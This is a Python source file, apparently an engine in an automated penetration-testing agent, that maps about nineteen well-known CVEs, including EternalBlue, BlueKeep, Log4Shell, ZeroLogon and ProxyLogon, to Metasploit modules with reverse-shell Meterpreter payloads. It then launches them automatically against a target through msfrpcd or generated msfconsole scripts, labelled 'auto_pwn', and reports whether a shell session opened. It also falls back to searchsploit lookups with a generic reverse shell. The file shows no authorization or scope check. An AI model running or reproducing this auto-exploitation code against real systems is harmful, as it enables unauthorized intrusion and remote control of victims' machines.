from __future__ import annotations

import json
import os
import re
import subprocess
import tempfile
from typing import Any

from skoll_agent.engines.base_engine import BaseEngine, EngineResult


_CVE_PATTERN = re.compile(r"CVE-\d{4}-\d{4,}", re.IGNORECASE)
_SESSION_PATTERN = re.compile(
    r"(Meterpreter|Command shell)\s+session\s+(\d+)\s+opened",
    re.IGNORECASE,
)
_FAIL_PATTERN = re.compile(r"\[-\]\s+Exploit\s+failed", re.IGNORECASE)
_SUCCESS_PATTERN = re.compile(r"\[\+\]\s+", re.IGNORECASE)


CVE_MODULE_MAP: dict[str, dict[str, Any]] = {
    "CVE-2017-0144": {
        "module": "exploit/windows/smb/ms17_010_eternalblue",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "service": "smb",
        "port": 445,
        "description": "EternalBlue SMB RCE (MS17-010)",
    },
    "CVE-2017-0143": {
        "module": "exploit/windows/smb/ms17_010_eternalblue",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "service": "smb",
        "port": 445,
        "description": "EternalBlue SMB RCE (MS17-010)",
    },
    "CVE-2014-6271": {
        "module": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "service": "http",
        "port": 80,
        "description": "Shellshock CGI RCE",
    },
    "CVE-2017-5638": {
        "module": "exploit/multi/http/struts2_content_type_ognl",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "service": "http",
        "port": 8080,
        "description": "Apache Struts2 RCE",
    },
    "CVE-2019-0708": {
        "module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "service": "rdp",
        "port": 3389,
        "description": "BlueKeep RDP RCE",
    },
    "CVE-2021-41773": {
        "module": "exploit/multi/http/apache_normalize_path",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "service": "http",
        "port": 80,
        "description": "Apache Path Traversal -> RCE",
    },
    "CVE-2021-44228": {
        "module": "exploit/multi/http/log4shell_header_injection",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "service": "http",
        "port": 80,
        "description": "Log4Shell RCE",
    },
    "CVE-2020-1472": {
        "module": "exploit/windows/zerologon/cve_2020_1472_zerologon",
        "payload": "",
        "service": "smb",
        "port": 445,
        "description": "ZeroLogon privilege escalation",
    },
    "CVE-2021-26855": {
        "module": "exploit/windows/http/exchange_proxylogon_rce",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "service": "http",
        "port": 443,
        "description": "ProxyLogon Exchange RCE",
    },
    "CVE-2020-0796": {
        "module": "exploit/windows/smb/cve_2020_0796_smbghost",
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "service": "smb",
        "port": 445,
        "description": "SMBGhost RCE",
    },
    "CVE-2018-7600": {
        "module": "exploit/multi/http/drupal_drupageddon",
        "payload": "php/meterpreter/reverse_tcp",
        "service": "http",
        "port": 80,
        "description": "Drupal RCE (Drupalgeddon2)",
    },
    "CVE-2019-9053": {
        "module": "exploit/multi/http/cmsms_upload_rce",
        "payload": "php/meterpreter/reverse_tcp",
        "service": "http",
        "port": 80,
        "description": "CMS Made Simple SQLi -> RCE",
    },
    "CVE-2022-22965": {
        "module": "exploit/multi/http/spring4shell",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "service": "http",
        "port": 8080,
        "description": "Spring4Shell RCE",
    },
    "CVE-2021-3129": {
        "module": "exploit/multi/http/laravel_ignition_rce",
        "payload": "php/meterpreter/reverse_tcp",
        "service": "http",
        "port": 80,
        "description": "Laravel Ignition RCE",
    },
    "CVE-2023-44487": {
        "module": "auxiliary/dos/http/http2_rapid_reset",
        "payload": "",
        "service": "http",
        "port": 80,
        "description": "HTTP/2 Rapid Reset DoS",
    },
    "CVE-2023-46604": {
        "module": "exploit/multi/http/apache_ofbiz_deserialization",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "service": "http",
        "port": 80,
        "description": "Apache OFBiz RCE",
    },
    "CVE-2024-1708": {
        "module": "exploit/linux/http/connectwise_screenconnect_rce",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "service": "http",
        "port": 80,
        "description": "ConnectWise ScreenConnect RCE",
    },
    "CVE-2024-27198": {
        "module": "exploit/multi/http/jetbrains_teamcity_rce",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "service": "http",
        "port": 80,
        "description": "JetBrains TeamCity RCE",
    },
    "CVE-2024-23897": {
        "module": "exploit/multi/http/jenkins_cli_deserialization",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "service": "http",
        "port": 8080,
        "description": "Jenkins CLI Deserialization RCE",
    },
}


class CVE2MSFEngine(BaseEngine):
    name = "cve2msf"
    description = "CVE-to-Metasploit bridge: detecta CVEs en hallazgos, busca exploit, ejecuta sync y registra si se obtuvo acceso"
    capabilities = ["cve_exploit", "auto_pwn"]

    def scan(self, target: str, **kwargs: Any) -> EngineResult:
        findings: list[dict[str, Any]] = kwargs.get("findings", [])
        confirmed_cves: list[str] = kwargs.get("confirmed_cves", [])
        ports: list[dict[str, Any]] = kwargs.get("ports", [])
        lhost: str = kwargs.get("lhost", self._detect_lhost())
        lport: int = int(kwargs.get("lport", 4444))
        msf_client = kwargs.get("msf_client", None)
        raw_lines: list[str] = []
        engine_findings: list[dict[str, Any]] = []

        cve_id = kwargs.get("cve_id", "")
        services = kwargs.get("services", [])
        if cve_id and not confirmed_cves:
            confirmed_cves = [cve_id]
        if services and not ports:
            ports = services

        if not confirmed_cves:
            confirmed_cves = self._extract_cves_from_findings(findings)

        if not confirmed_cves:
            raw_lines.append("[INFO] No CVEs found in input")
            return EngineResult(success=True, raw_output="\n".join(raw_lines),
                                findings=[], summary="cve2msf: no CVEs to process")

        port_map = self._build_port_map(ports, findings)
        raw_lines.append(f"[INFO] Processing {len(confirmed_cves)} confirmed CVEs")
        raw_lines.append(f"[INFO] LHOST={lhost} LPORT={lport}")
        rpc_available = msf_client is not None
        raw_lines.append(f"[INFO] RPC mode: {'ENABLED' if rpc_available else 'DISABLED (fallback subprocess)'}")

        for cve in confirmed_cves:
            cve_upper = cve.upper().strip()

            module_info = CVE_MODULE_MAP.get(cve_upper)
            if not module_info:
                module_info = self._searchsploit_lookup(cve_upper)
                if not module_info:
                    raw_lines.append(f"[SKIP] {cve}: no Metasploit module found")
                    continue

            cve_target, cve_port = self._resolve_target(cve_upper, target, port_map, module_info)
            if not cve_target:
                raw_lines.append(f"[SKIP] {cve}: could not resolve target host")
                continue

            raw_lines.append(f"[EXPLOIT] {cve} -> {module_info['module']} on {cve_target}:{cve_port}")
            raw_lines.append(f"[EXPLOIT] {module_info.get('description', '')}")

            exploit_result = self._execute_via_msf(
                cve=cve_upper,
                module=module_info["module"],
                target=cve_target,
                port=cve_port,
                lhost=lhost,
                lport=lport,
                payload=module_info.get("payload", ""),
                msf_client=msf_client,
                raw_lines=raw_lines,
            )

            session_id = exploit_result.get("session_id")
            msf_output = exploit_result.get("output", "")
            exploit_failed = bool(_FAIL_PATTERN.search(msf_output))
            exploit_success = session_id is not None or (
                bool(_SUCCESS_PATTERN.search(msf_output)) and not exploit_failed
            )

            finding: dict[str, Any] = {
                "file_path": cve_target,
                "line_start": 0, "line_end": 0,
                "severity": "critical",
                "title": f"CVE2MSF: {cve} — {module_info.get('description', 'exploit launched')}",
                "description": (
                    f"CVE: {cve}\n"
                    f"Module: {module_info['module']}\n"
                    f"Target: {cve_target}:{cve_port}\n"
                    f"Sesión obtenida: {f'Sesión #{session_id}' if session_id else 'NO'}\n"
                    f"Estado: {'VULNERABLE (exploit exitoso)' if exploit_success and not exploit_failed else 'FAILED (el exploit no funcionó)' if exploit_failed else 'NO CONFIRMADO'}"
                ),
                "tool": self.name,
                "rule_id": f"cve2msf-{cve.lower()}",
                "cve_id": cve_upper,
                "exploit_module": module_info["module"],
                "exploit_target": f"{cve_target}:{cve_port}",
                "session_id": session_id,
                "access_gained": session_id is not None,
                "msf_output": msf_output[:2000],
                "exploit_source": exploit_result.get("source", "subprocess"),
            }
            engine_findings.append(finding)

        summary_parts = [f"cve2msf: {len(engine_findings)} CVEs procesados"]
        sessions = [f for f in engine_findings if f.get("access_gained")]
        if sessions:
            summary_parts.append(f"{len(sessions)} sesiones obtenidas")
        return EngineResult(
            success=len(sessions) > 0,
            raw_output="\n".join(raw_lines),
            findings=engine_findings,
            summary=", ".join(summary_parts),
        )

    def _execute_via_msf(
        self,
        cve: str, module: str, target: str, port: int,
        lhost: str, lport: int, payload: str,
        msf_client: Any, raw_lines: list[str],
    ) -> dict[str, Any]:
        if msf_client is not None:
            try:
                raw_lines.append(f"[RPC] Executing {module} via msfrpcd...")
                result = msf_client.execute_module(
                    module=module, rhosts=target, rport=port,
                    payload=payload, lhost=lhost, lport=lport,
                    timeout=120,
                )
                raw_lines.append(f"[RPC] Source: {result.get('source', 'rpc')}")
                if result.get("session_id"):
                    raw_lines.append(f"[RPC] Session #{result['session_id']} opened")
                return result
            except Exception as e:
                raw_lines.append(f"[RPC] Error: {e}, falling back to subprocess")

        raw_lines.append(f"[MSF] Executing {module} via msfconsole subprocess...")
        rc_path = self._generate_rc_script(
            cve=cve, module=module, target=target, port=port,
            lhost=lhost, lport=lport, payload=payload,
        )
        msf_output, session_id = self._run_msfconsole(rc_path, raw_lines)
        return {
            "success": session_id is not None,
            "session_id": session_id,
            "output": msf_output,
            "source": "subprocess",
        }

    def _extract_cves_from_findings(self, findings: list[dict[str, Any]]) -> list[str]:
        cves: set[str] = set()
        for f in findings:
            cve_id = f.get("cve_id", "")
            if cve_id and _CVE_PATTERN.fullmatch(cve_id.strip()):
                cves.add(cve_id.upper())
            title = f.get("title", "")
            desc = f.get("description", "")
            for text in (title, desc):
                for match in _CVE_PATTERN.finditer(text):
                    cves.add(match.group(0).upper())
        return list(cves)

    def _build_port_map(self, ports: list[dict[str, Any]], findings: list[dict[str, Any]]) -> dict[str, list[dict[str, Any]]]:
        port_map: dict[str, list[dict[str, Any]]] = {}
        for p in ports:
            svc = p.get("service", "unknown").lower()
            port_map.setdefault(svc, []).append(p)
        for f in findings:
            p = f.get("port", 0)
            svc = f.get("service", "").lower()
            if p and svc:
                port_map.setdefault(svc, []).append({"port": p, "service": svc})
        return port_map

    def _resolve_target(self, cve: str, default_target: str,
                        port_map: dict[str, list[dict[str, Any]]],
                        module_info: dict[str, Any]) -> tuple[str, int]:
        expected_service = module_info.get("service", "")
        expected_port = module_info.get("port", 0)
        if expected_service and expected_service in port_map:
            entries = port_map[expected_service]
            if entries:
                entry = entries[0]
                return default_target, entry.get("port", expected_port)
        if default_target:
            return default_target, expected_port
        return "", 0

    def _generate_rc_script(self, cve: str, module: str, target: str,
                            port: int, lhost: str, lport: int,
                            payload: str) -> str:
        lines = [
            f"use {module}",
            f"set RHOSTS {target}",
            f"set RPORT {port}",
        ]
        if payload:
            lines.append(f"set PAYLOAD {payload}")
            lines.append(f"set LHOST {lhost}")
            lines.append(f"set LPORT {lport}")
            lines.append("set ExitOnSession false")
        lines.extend([
            "set VERBOSE true",
            "show options",
            "run",
            "sessions -l",
            "exit",
        ])
        rc_content = "\n".join(lines)

        rc_dir = "/tmp/cve2msf"
        os.makedirs(rc_dir, exist_ok=True)
        safe_cve = cve.replace("/", "_").replace(" ", "_")
        rc_path = os.path.join(rc_dir, f"{safe_cve}.rc")
        with open(rc_path, "w") as f:
            f.write(rc_content)
        return rc_path

    def _run_msfconsole(self, rc_path: str, raw_lines: list[str]) -> tuple[str, int | None]:
        cmd = ["msfconsole", "-q", "-r", rc_path]
        raw_lines.append(f"[MSF] Running: {' '.join(cmd)}")
        try:
            result = subprocess.run(
                cmd,
                capture_output=True, text=True, timeout=120,
            )
            output = result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            raw_lines.append("[TIMEOUT] msfconsole excedió 120s")
            return "[TIMEOUT]", None
        except FileNotFoundError:
            raw_lines.append("[ERR] msfconsole no instalado")
            return "[ERR] msfconsole not found", None
        except Exception as e:
            raw_lines.append(f"[ERR] msfconsole error: {e}")
            return f"[ERR] {e}", None

        session_id: int | None = None
        for m in _SESSION_PATTERN.finditer(output):
            session_id = int(m.group(2))
            raw_lines.append(f"[SESSION] {m.group(1)} session #{session_id} opened")
            break

        if _FAIL_PATTERN.search(output):
            raw_lines.append("[FAIL] Exploit failed")
        elif session_id:
            raw_lines.append("[+] Access gained! Session disponible en msfconsole")

        return output, session_id

    def _detect_lhost(self) -> str:
        try:
            r = subprocess.run(
                ["ip", "route", "get", "1"],
                capture_output=True, text=True, timeout=5,
            )
            m = re.search(r"src\s+(\d+\.\d+\.\d+\.\d+)", r.stdout)
            if m:
                return m.group(1)
        except Exception:
            pass
        return "127.0.0.1"

    def _searchsploit_lookup(self, cve: str) -> dict[str, Any] | None:
        try:
            r = subprocess.run(
                ["searchsploit", "--cve", cve, "--json"],
                capture_output=True, text=True, timeout=30,
            )
            if r.returncode != 0:
                return None
            stdout_clean = re.sub(r'[^\x20-\x7e\n]', '', r.stdout)
            data = json.loads(stdout_clean)
            entries = data.get("RESULTS_EXPLOIT", data.get("RESULTS", []))
            if not entries:
                return None
            first = entries[0]
            path = first.get("Path", "")
            edb_id = first.get("EDB-ID", "")
            title = first.get("Title", "")
            tags = first.get("Tags", "")
            msf_tag = tags if isinstance(tags, str) else ""
            if "Metasploit" in msf_tag and "exploit/" in path.lower():
                msf_module = path.replace("/usr/share/exploitdb/exploits/", "").replace(".rb", "").replace("/", "/")
            else:
                msf_module = "exploit/multi/handler"
            return {
                "module": msf_module,
                "payload": "generic/shell_reverse_tcp",
                "service": data.get("Port", "unknown") or "unknown",
                "port": int(data.get("Port", 0)) if data.get("Port", "").isdigit() else 0,
                "description": f"searchsploit: {title[:150]} (EDB-{edb_id})",
                "local_path": path,
                "edb_id": edb_id,
            }
        except (subprocess.TimeoutExpired, FileNotFoundError, json.JSONDecodeError):
            return None

    def parse_output(self, raw_output: str) -> list[dict[str, Any]]:
        return []
